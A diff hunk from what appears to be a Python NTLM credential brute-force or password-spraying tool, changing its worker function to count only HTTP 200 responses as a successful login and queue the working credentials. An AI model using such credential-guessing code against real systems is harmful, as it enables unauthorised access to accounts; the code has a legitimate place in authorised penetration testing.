@@ -56,12 +56,12 @@ def worker(url, cred_queue, success_queue, domain):
         user = '{0}\\{1}'.format(domain, creds[0])
         auth = HttpNtlmAuth(user, creds[1])
         resp = requests.get(url, auth=auth, verify=False)
-        if resp.status_code == 401:
-            print '[-] Failure: {0}/{1}'.format(creds[0], creds[1])
-        else:
+        if resp.status_code == 200:
             print '[+] Success: {0}/{1}'.format(creds[0], creds[1])
             success_queue.put(creds)
             return
+        else:
+            print '[-] Failure: {0}/{1}'.format(creds[0], creds[1])
 
 
 if __name__ == '__main__':
